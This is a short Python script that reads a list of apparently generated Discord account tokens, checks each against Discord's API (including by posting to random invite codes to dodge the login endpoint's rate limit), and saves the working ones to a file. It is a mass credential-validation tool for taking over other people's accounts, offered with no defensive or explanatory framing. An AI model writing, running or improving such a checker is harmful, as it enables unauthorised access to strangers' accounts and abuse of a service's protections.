from requests import get, post
from random import randint

class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    FAIL = '\033[91m' #RED
    RESET = '\033[0m' #RESET COLOR

def variant1(token):
    response = get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})#Bad variant for mass token check due to the rate limit.
    return True if response.status_code == 200 else False

def variant2(token):
    response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
        return False
    else:
        return True

def variant2_Status(token):
    response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if response.status_code == 401:
        return 'Invalid'
    elif "You need to verify your account in order to perform this action." in str(response.content):
        return 'Phone Lock'
    else:
        return 'Valid'

if __name__ == "__main__":
    try:
        checked = []
        with open('Generated Tokens Avancé.txt', 'r') as tokens:
            for token in tokens.read().split('\n'):
                if len(token) > 15 and token not in checked and variant1(token) == True:
                    print(bcolors.OK +f'Token: {token} is Valid'+ bcolors.RESET)
                    checked.append(token)
                else:
                    print(f'Token: {token} is Invalid')
        if len(checked) > 0:
                name = randint(100000000, 9999999999)
                with open(f'valide/{name}.txt', 'w') as saveFile:
                    saveFile.write('\n'.join(checked))
                print(f'Tokens Save To {name}.txt File!')
    except:
        input('Can`t Open "tokens.txt" File!')